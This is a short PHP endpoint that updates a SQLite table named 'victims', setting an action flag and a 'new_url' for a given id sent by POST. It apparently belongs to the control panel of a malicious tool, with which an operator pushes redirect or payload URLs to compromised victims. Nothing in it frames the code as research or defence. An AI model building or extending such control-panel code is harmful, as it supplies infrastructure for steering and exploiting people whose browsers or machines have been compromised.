<?php
	include('prereq.php');
	$db = new MyDB();

	if(	isset($_POST['i']) && isset($_POST['n'])){
		$stm = $db->prepare("UPDATE victims SET action = 1, new_url = ? WHERE id = ?");
		$stm->bindParam(1, $_POST['n'], SQLITE3_TEXT);	
		$stm->bindParam(2, $_POST['i'], SQLITE3_INTEGER);	
		$stm->execute();
		print "ok";
	}
	else
	{
		print "Error";
	}

	$db->close();
	unset($db);

?>
